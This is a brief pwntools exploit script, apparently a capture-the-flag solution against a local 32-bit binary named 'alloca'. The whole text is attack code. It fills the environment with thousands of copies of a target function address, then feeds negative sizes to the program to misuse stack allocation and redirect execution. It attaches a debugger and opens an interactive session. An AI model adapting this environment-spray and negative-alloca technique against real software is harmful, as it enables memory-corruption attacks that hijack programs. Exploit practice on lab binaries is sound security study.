from pwn import *

callme = 0x80485ab
e = {str(i): p32(callme) * 30000 for i in range(15)}

r = process("./alloca", env = e)

r.sendline("-80")
gdb.attach(r, 'b *0x8048835\nc\nn')
r.sendline('-2097152') # 0xffe00000

r.interactive()